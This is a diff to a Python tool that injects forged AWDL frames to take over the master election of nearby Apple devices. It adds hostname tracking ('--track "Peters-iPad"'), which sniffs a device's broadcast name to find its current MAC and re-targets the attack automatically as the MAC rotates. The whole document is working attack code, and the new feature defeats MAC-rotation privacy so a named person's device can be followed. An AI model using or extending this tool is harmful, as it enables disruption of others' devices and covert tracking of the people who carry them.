@@ -58,6 +58,11 @@ Example:
     #   sudo ./awdl_prepare_stick.sh wlan0 44
     sudo ./awdl_master_inject.py -i wlan0 -t 11:22:33:44:55:66 -c 44
 
+    # Follow a device by its (stable) AWDL hostname instead of a MAC: Apple
+    # devices rotate their MAC, so --track resolves the name to the current MAC
+    # by sniffing and re-targets automatically as it rotates:
+    sudo ./awdl_master_inject.py -i wlan0 --track "Peters-iPad" -c 6 --setup
+
 Integration:
     The injection loop reads every live parameter (targets, source, election
     counter, channel, ...) from a ``ParamStore`` before building each frame, so
@@ -209,6 +214,15 @@ def parse_macs(text):
     if not macs:
         raise argparse.ArgumentTypeError("no MAC address given")
     return macs
+
+
+def parse_names(text):
+    """Parse one or more comma-separated hostnames into a list of strings."""
+    names = [part.strip() for part in str(text).split(",")]
+    names = [n for n in names if n]
+    if not names:
+        raise argparse.ArgumentTypeError("no hostname given")
+    return names
 
 
 def mac_str(raw):
@@ -635,6 +649,59 @@ def apply_snapshot(builder, snap):
     builder.aw_offset = snap["aw_offset"]
 
 
+class HostnameTracker:
+    """Resolve AWDL device hostnames to their current MAC and keep a
+    :class:`ParamStore`'s ``targets`` in sync as those MACs rotate.
+
+    Apple devices rotate their Wi-Fi / AWDL MAC, but keep broadcasting a stable
+    hostname (the Arpa TLV, e.g. ``"Peters-iPad"``) in their MIFs.  Give the
+    hostname(s) to follow and the tracker rewrites ``store``'s ``targets`` to
+    ``fixed + <currently-resolved MACs>`` whenever a tracked device first
+    appears or its MAC changes -- so a rotated MAC never has to be re-entered.
+
+    Matching is case-insensitive on the advertised hostname.  Pass the observed
+    frames in via :meth:`observe` (``poll_rx`` does this during injection).
+    """
+
+    def __init__(self, store, fixed=(), names=()):
+        self.store = store
+        self.fixed = [bytes(m) for m in fixed]
+        self.names = [n.lower() for n in names]
+        self.resolved = {}       # hostname (lower-case) -> current MAC (bytes)
+        self._apply()
+
+    def observe(self, src, hostname):
+        """Feed one observed ``(src MAC, hostname)``.
+
+        Returns ``(hostname, old_mac_or_None, new_mac)`` when a tracked device's
+        MAC changed (or it was seen for the first time), else ``None``.
+        """
+        if hostname is None:
+            return None
+        key = hostname.lower()
+        if key not in self.names:
+            return None
+        src = bytes(src)
+        old = self.resolved.get(key)
+        if old == src:
+            return None
+        self.resolved[key] = src
+        self._apply()
+        return (hostname, old, src)
+
+    def _apply(self):
+        targets = list(self.fixed)
+        for key in self.names:
+            mac = self.resolved.get(key)
+            if mac is not None and mac not in targets:
+                targets.append(mac)
+        self.store.update(targets=targets)
+
+    def unresolved(self):
+        """Tracked hostnames that have not been seen (resolved) yet."""
+        return [n for n in self.names if n not in self.resolved]
+
+
 # ---------------------------------------------------------------------------
 # injection
 # ---------------------------------------------------------------------------
@@ -696,36 +763,14 @@ def set_channel(ifname, channel):
         return False
 
 
-def parse_awdl_src(buf):
-    """If ``buf`` is an AWDL action frame, return its source MAC, else None.
+def parse_awdl_info(buf):
+    """Parse a received AWDL action frame once, extracting the fields the tool
+    cares about.
 
-    ``buf`` is a received monitor-mode frame: radiotap header + 802.11 frame.
-    """
-    if len(buf) < 4:
-        return None
-    rt_len = struct.unpack_from("<H", buf, 2)[0]      # radiotap it_len
-    # need the 24-byte 802.11 management header + the start of the action body
-    if len(buf) < rt_len + 24 + 5:
-        return None
-    frame_control = struct.unpack_from("<H", buf, rt_len)[0]
-    # management (type 0) + action (subtype 13) => low byte 0xD0
-    if frame_control & 0x00FC != 0x00D0:
-        return None
-    src = buf[rt_len + 10:rt_len + 16]                # addr2 = transmitter
-    body = buf[rt_len + 24:]
-    # action body: category(127) + OUI(00:17:f2) + type(8)
-    if body[0] == IEEE80211_VENDOR_SPECIFIC and body[1:4] == AWDL_OUI \
-            and body[4] == AWDL_TYPE:
-        return src
-    return None
-
-
-def parse_awdl_election(buf):
-    """Parse a received AWDL action frame's Election Parameters v2 TLV.
-
-    Returns a tuple (src, master_addr, master_counter, self_counter) where
-    master_addr is None if the frame is AWDL but carries no v2 TLV, or None if
-    the frame is not an AWDL action frame at all.
+    Returns a tuple ``(src, hostname, master_addr, self_counter)`` -- where
+    ``hostname`` (from the Arpa TLV), ``master_addr`` and ``self_counter`` (from
+    the Election Parameters v2 TLV) are ``None`` when that TLV is absent -- or
+    ``None`` if the frame is not an AWDL action frame at all.
     """
     if len(buf) < 4:
         return None
@@ -741,6 +786,7 @@ def parse_awdl_election(buf):
             and body[4] == AWDL_TYPE):
         return None
     src = buf[rt_len + 10:rt_len + 16]
+    hostname = master_addr = self_counter = None
     tlvs = body[16:]                         # after the 16-byte awdl_action header
     i = 0
     while i + 3 <= len(tlvs):
@@ -749,19 +795,27 @@ def parse_awdl_election(buf):
         val = tlvs[i + 3:i + 3 + tlen]
         if ttype == AWDL_ELECTION_PARAMETERS_V2_TLV and len(val) >= 40:
             master_addr = val[0:6]
-            master_counter = struct.unpack_from("<I", val, 12)[0]
             self_counter = struct.unpack_from("<I", val, 36)[0]
-            return (src, master_addr, master_counter, self_counter)
+        elif ttype == AWDL_ARPA_TLV and len(val) >= 2:
+            # body layout (src/frame.h): flags(1) name_length(1) name suffix(2)
+            nlen = val[1]
+            name = val[2:2 + nlen]
+            if nlen and len(name) == nlen:
+                hostname = name.decode("utf-8", "replace")
         i += 3 + tlen
-    return (src, None, None, None)           # AWDL frame, but no v2 TLV
+    return (src, hostname, master_addr, self_counter)
 
 
-def watch_poll(sock, our_src, state):
-    """Drain buffered RX frames and update ``state`` with each peer's master.
+def poll_rx(sock, our_src, watch_state=None, tracker=None):
+    """Drain buffered RX frames once (non-blocking).
 
-    ``state`` maps peer MAC string -> (master MAC string, self_counter, seen_at).
-    Frames from our own source are skipped.
+    Feeds every observed AWDL hostname to ``tracker`` (if given) so it can
+    follow MAC rotations, and records each peer's advertised master in
+    ``watch_state`` (if given; frames from our own source are skipped). Returns
+    the rotation changes the tracker detected this call, as a list of
+    ``(hostname, old_mac_or_None, new_mac)`` tuples.
     """
+    changes = []
     sock.setblocking(False)
     try:
         while True:
@@ -769,15 +823,21 @@ def watch_poll(sock, our_src, state):
                 buf = sock.recv(4096)
             except (BlockingIOError, OSError, socket.timeout):
                 break
-            info = parse_awdl_election(buf)
-            if not info:
+            info = parse_awdl_info(buf)
+            if info is None:
                 continue
-            psrc, maddr, _mctr, sctr = info
-            if psrc == our_src or maddr is None:
-                continue
-            state[mac_str(psrc)] = (mac_str(maddr), sctr, time.monotonic())
+            psrc, hostname, maddr, sctr = info
+            if tracker is not None and hostname is not None:
+                change = tracker.observe(psrc, hostname)
+                if change is not None:
+                    changes.append(change)
+            if watch_state is not None and maddr is not None \
+                    and bytes(psrc) != bytes(our_src):
+                watch_state[mac_str(psrc)] = (mac_str(maddr), sctr,
+                                              time.monotonic())
     finally:
         sock.setblocking(True)
+    return changes
 
 
 def watch_report(state, our_src_str):
@@ -810,13 +870,15 @@ def _drain(sock):
         sock.setblocking(True)
 
 
-def sweep_for_channel(sock, ifname, targets, channels, dwell):
+def sweep_for_channel(sock, ifname, targets, names, channels, dwell):
     """Listen on each candidate channel and return the one with the most AWDL
-    frames from any of ``targets`` (or None if none is seen anywhere)."""
+    frames from any of ``targets`` (MACs) or ``names`` (hostnames), or None if
+    none is seen anywhere."""
     target_set = {bytes(t) for t in targets}
+    name_set = {n.lower() for n in names}
+    wanted = [mac_str(t) for t in targets] + list(names)
     print("[*] sweeping for %s on channels %s (%.1fs each)"
-          % (", ".join(mac_str(t) for t in targets),
-             ",".join(str(c) for c in channels), dwell))
+          % (", ".join(wanted), ",".join(str(c) for c in channels), dwell))
     counts = {}
     for ch in channels:
         if not set_channel(ifname, ch):
@@ -832,8 +894,12 @@ def sweep_for_channel(sock, ifname, targets, channels, dwell):
                 continue
             except OSError:
                 break
-            src = parse_awdl_src(buf)
-            if src is not None and bytes(src) in target_set:
+            info = parse_awdl_info(buf)
+            if info is None:
+                continue
+            src, hostname, _maddr, _sctr = info
+            if bytes(src) in target_set or \
+                    (hostname is not None and hostname.lower() in name_set):
                 n += 1
         counts[ch] = n
         print("    channel %3d: %d AWDL frame(s) from target(s)" % (ch, n))
@@ -878,7 +944,7 @@ def prepare_stick(ifname, regdomain="US", channel=None):
 def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
                   count=0, psf=False, watch=False, rotate_channels=None,
                   channel_dwell=CHANNEL_DWELL_DEFAULT,
-                  counter_step=MASTER_COUNTER_STEP, stop=None):
+                  counter_step=MASTER_COUNTER_STEP, stop=None, tracker=None):
     """Inject AWDL MIF frames, reading every live parameter from ``store``.
 
     This is the reusable core of the tool.  Before building each frame it pulls
@@ -905,6 +971,9 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
                         more than one entry the rotation owns the channel and
                         the active channel is written back into the store
         stop            optional ``threading.Event``; set it to end the loop
+        tracker         optional :class:`HostnameTracker`; when given, received
+                        frames are fed to it so it can follow MAC rotations and
+                        update ``store``'s ``targets`` automatically
 
     Returns the ``(sent, dropped)`` frame counts.
     """
@@ -960,13 +1029,20 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
         # keep the master "live": advance the counter so it is never stale
         store.advance_counter(counter_step, UINT32_MAX)
 
-        if watch:
-            our_src = snap["source"]
-            watch_poll(sock, our_src, watch_state)
-            now = time.monotonic()
-            if now - last_report >= 1.0:
-                watch_report(watch_state, mac_str(our_src))
-                last_report = now
+        if watch or tracker is not None:
+            changes = poll_rx(sock, snap["source"],
+                              watch_state if watch else None, tracker)
+            for hostname, old, new in changes:
+                if old is None:
+                    print("    [track] %s -> %s" % (hostname, mac_str(new)))
+                else:
+                    print("    [track] %s rotated %s -> %s"
+                          % (hostname, mac_str(old), mac_str(new)))
+            if watch:
+                now = time.monotonic()
+                if now - last_report >= 1.0:
+                    watch_report(watch_state, mac_str(snap["source"]))
+                    last_report = now
 
         if count and sent >= count:
             break
@@ -998,12 +1074,20 @@ def main(argv=None):
     )
     parser.add_argument("-i", "--interface", required=True,
                         help="monitor-mode Wi-Fi interface to inject on")
-    parser.add_argument("-t", "--target", required=True, type=parse_macs,
+    parser.add_argument("-t", "--target", type=parse_macs, default=None,
                         action="append", metavar="MAC[,MAC...]",
                         help="destination MAC address(es) the frames are directed "
                              "at; give several comma-separated and/or repeat -t "
                              "(one frame is sent to each per cycle). Use "
-                             "ff:ff:ff:ff:ff:ff to broadcast")
+                             "ff:ff:ff:ff:ff:ff to broadcast. Required unless "
+                             "--track is given")
+    parser.add_argument("--track", type=parse_names, default=None,
+                        action="append", metavar="NAME[,NAME...]",
+                        help="AWDL hostname(s) to follow (e.g. \"Peters-iPad\"); "
+                             "the tool sniffs, resolves each to the device's "
+                             "current MAC and re-targets automatically as the "
+                             "MAC rotates -- so you never re-enter a rotated MAC. "
+                             "Comma-separated and/or repeatable; combinable with -t")
     parser.add_argument("-s", "--source", type=parse_mac, default=None,
                         help="source MAC / master identity to advertise "
                              "(default: interface MAC, else random local MAC)")
@@ -1096,13 +1180,20 @@ def main(argv=None):
     if src is None:
         src = get_iface_mac(args.interface) or random_local_mac()
 
-    # Flatten the target MAC(s): -t accepts comma-separated lists and may be
-    # repeated, so args.target is a list of lists. Dedupe, keeping order.
-    targets = []
-    for group in args.target:
+    # Flatten -t / --track (each accepts comma-separated lists and may be
+    # repeated, so argparse hands us a list of lists). Dedupe, keeping order.
+    fixed_targets = []
+    for group in (args.target or []):
         for mac in group:
-            if mac not in targets:
-                targets.append(mac)
+            if mac not in fixed_targets:
+                fixed_targets.append(mac)
+    track_names = []
+    for group in (args.track or []):
+        for name in group:
+            if name not in track_names:
+                track_names.append(name)
+    if not fixed_targets and not track_names:
+        parser.error("give at least one -t/--target MAC or --track hostname")
 
     metric = args.metric & UINT32_MAX
     counter = args.counter & UINT32_MAX
@@ -1136,13 +1227,15 @@ def main(argv=None):
                 sock.close()
                 sys.exit("error: 'iw' is required to detect the channel; "
                          "install it or pass -c/--channel/--channels")
-            channel = sweep_for_channel(sock, args.interface, targets,
-                                        AWDL_SOCIAL_CHANNELS, args.sweep_dwell)
+            channel = sweep_for_channel(sock, args.interface, fixed_targets,
+                                        track_names, AWDL_SOCIAL_CHANNELS,
+                                        args.sweep_dwell)
             if channel is None:
                 sock.close()
                 sys.exit("error: target(s) %s not seen on any AWDL channel; "
                          "pass -c/--channel to set it manually"
-                         % ", ".join(mac_str(t) for t in targets))
+                         % ", ".join([mac_str(t) for t in fixed_targets]
+                                     + track_names))
             print("[*] detected target on channel %d" % channel)
             channel_list = [channel]
             if not set_channel(args.interface, channel):
@@ -1157,7 +1250,8 @@ def main(argv=None):
                       % (args.interface, channel))
 
     builder = AwdlFrameBuilder(
-        src=src, dst=targets[0], channel=channel,
+        src=src, dst=(fixed_targets[0] if fixed_targets else BROADCAST),
+        channel=channel,
         master_metric=metric, master_counter=counter,
         self_metric=metric, self_counter=counter,
         hostname=args.hostname, devclass=DEVCLASS_NAMES[args.devclass],
@@ -1168,7 +1262,10 @@ def main(argv=None):
 
     if args.dry_run:
         print("# source (master) : %s" % mac_str(src))
-        print("# target(s) (dst) : %s" % ", ".join(mac_str(t) for t in targets))
+        print("# target(s) (dst) : %s"
+              % (", ".join(mac_str(t) for t in fixed_targets) or "(none fixed)"))
+        if track_names:
+            print("# tracking hostnames: %s" % ", ".join(track_names))
         print("# channel         : %d" % channel)
         print("# election counter : 0x%08x" % counter)
         print("# election metric  : 0x%08x" % metric)
@@ -1190,12 +1287,18 @@ def main(argv=None):
     # fresh snapshot from it before every frame, so other code can change these
     # values at runtime. The CLI just seeds it from the parsed arguments.
     store = ParamStore(
-        targets=targets, source=src, channel=channel,
+        targets=list(fixed_targets), source=src, channel=channel,
         master_metric=metric, master_counter=counter,
         self_metric=metric, self_counter=counter,
         awdl_version=args.awdl_version, hostname=args.hostname,
         devclass=DEVCLASS_NAMES[args.devclass], aw_offset=args.aw_offset,
     )
+
+    # When hostnames are tracked, the tracker resolves them to current MACs and
+    # keeps store["targets"] = fixed + resolved up to date as the MACs rotate.
+    tracker = None
+    if track_names:
+        tracker = HostnameTracker(store, fixed=fixed_targets, names=track_names)
 
     # graceful Ctrl+C -> set the stop event the loop polls
     stop = threading.Event()
@@ -1206,7 +1309,11 @@ def main(argv=None):
     print("    master   : %s  (counter=0x%08x metric=0x%08x awdl=%d.%d)"
           % (mac_str(src), counter, metric,
              (args.awdl_version >> 4) & 0xF, args.awdl_version & 0xF))
-    print("    directed at: %s" % ", ".join(mac_str(t) for t in targets))
+    if fixed_targets:
+        print("    directed at: %s" % ", ".join(mac_str(t) for t in fixed_targets))
+    if track_names:
+        print("    tracking : %s (resolving to current MAC, follows rotation)"
+              % ", ".join(track_names))
     print("    timing   : interval=%s aw=%dTU af=%dTU presence=%d offset=%dTU%s"
           % ("once" if args.interval <= 0 else "%gms" % (args.interval * 1000),
              args.aw_period, args.af_period, args.presence_mode, args.aw_offset,
@@ -1223,7 +1330,7 @@ def main(argv=None):
             sock, store, builder, args.interface,
             interval=args.interval, duration=args.duration, count=args.count,
             psf=args.psf, watch=args.watch, rotate_channels=rotate_channels,
-            channel_dwell=args.channel_dwell, stop=stop,
+            channel_dwell=args.channel_dwell, stop=stop, tracker=tracker,
         )
     finally:
         sock.close()
